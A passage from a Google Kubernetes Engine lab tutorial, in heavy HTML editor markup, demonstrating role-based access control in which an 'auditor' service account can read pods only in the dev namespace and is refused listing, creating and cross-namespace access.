1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create -n test -f ./manifests/hello-server.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">service/hello-server created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-server created</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a server in each namespace</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><p><span>As the owner, you will also be able to view all pods.</span></p><ul><li><p><span>On the &quot;owner&quot; instance list all </span><code>hello-server</code><span> pods in all namespaces by running:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods -l app=hello-server --all-namespaces</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAMESPACE &nbsp; NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  READY &nbsp; &nbsp; STATUS &nbsp;  RESTARTS &nbsp; AGE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">dev &nbsp; &nbsp; &nbsp; &nbsp; hello-server-6c6fd59cc9-h6zg9 &nbsp; 1/1 &nbsp; &nbsp; &nbsp; Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  6m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">prod &nbsp; &nbsp; &nbsp;  hello-server-6c6fd59cc9-mw2zt &nbsp; 1/1 &nbsp; &nbsp; &nbsp; Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  44s</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">test &nbsp; &nbsp; &nbsp;  hello-server-6c6fd59cc9-sm6bs &nbsp; 1/1 &nbsp; &nbsp; &nbsp; Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  39s</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><h3 id='viewing-resources-as-the-auditor'><span>Viewing resources as the auditor</span></h3><p><span>Now you will open a new terminal, SSH into the auditor instance, and try to view all namespaces.</span></p><ol start='' ><li><p><span>Open a new Cloud Shell terminal by clicking the </span><strong><span>+</span></strong><span> at the top of the terminal window.</span></p></li><li><p><span>SSH to the &quot;auditor&quot; instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh gke-tutorial-auditor</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> Ignore the error which relates to gcp auth plugin.</span></p><ol start='' ><li><p><span>When prompted about the zone, enter </span><code>n</code><span>, so the default zone is used.</span></p></li><li><p><span>Install gke-gcloud-auth-plugin:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "export USE_GKE_GCLOUD_AUTH_PLUGIN=True" &gt;&gt; ~/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">source ~/.bashrc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container clusters get-credentials rbac-demo-cluster --zone europe-west4-a</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>On the &quot;auditor&quot; instance, list all </span><code>hello-server</code><span> pods in all namespaces with the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods -l app=hello-server --all-namespaces</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see an error like the following:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (Forbidden): pods is forbidden: User "gke-tutorial-auditor@myproject.iam.gserviceaccount.com" cannot list pods at the cluster scope: Required "container.pods.list" permission</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>The error indicates that you don&#39;t have sufficient permissions. The auditor role is restricted to viewing only the resources in the dev namespace, so you&#39;ll need to specify the namespace when viewing resources.</span></p><p><span>Now attempt to view pods in the dev namespace.</span></p><ol start='' ><li><p><span>On the &quot;auditor&quot; instance run the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods -l app=hello-server --namespace=dev</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  READY &nbsp; &nbsp; STATUS &nbsp;  RESTARTS &nbsp; AGE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">hello-server-6c6fd59cc9-h6zg9 &nbsp; 1/1 &nbsp; &nbsp; &nbsp; Running &nbsp; 0 &nbsp; &nbsp; &nbsp; &nbsp;  13m</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>Try to view pods in the test namespace:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods -l app=hello-server --namespace=test</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (Forbidden): pods is forbidden: User "gke-tutorial-auditor@myproject.iam.gserviceaccount.com" cannot list pods in the namespace "test": Required "container.pods.list" permission.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>Attempt to view pods in the prod namespace:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods -l app=hello-server --namespace=prod</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (Forbidden): pods is forbidden: User "gke-tutorial-auditor@myproject.iam.gserviceaccount.com" cannot list pods in the namespace "prod": Required "container.pods.list" permission.</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Finally, verify that the auditor has read-only access by trying to create and delete a deployment in the dev namespace.</span></p><ol start='' ><li><p><span>On the &quot;auditor&quot; instance attempt to create a deployment:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create -n dev -f manifests/hello-server.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (Forbidden): error when creating "manifests/hello-server.yaml": services is forbidden: User "gke-tutorial-auditor@myproject.iam.gserviceaccount.com" cannot create services 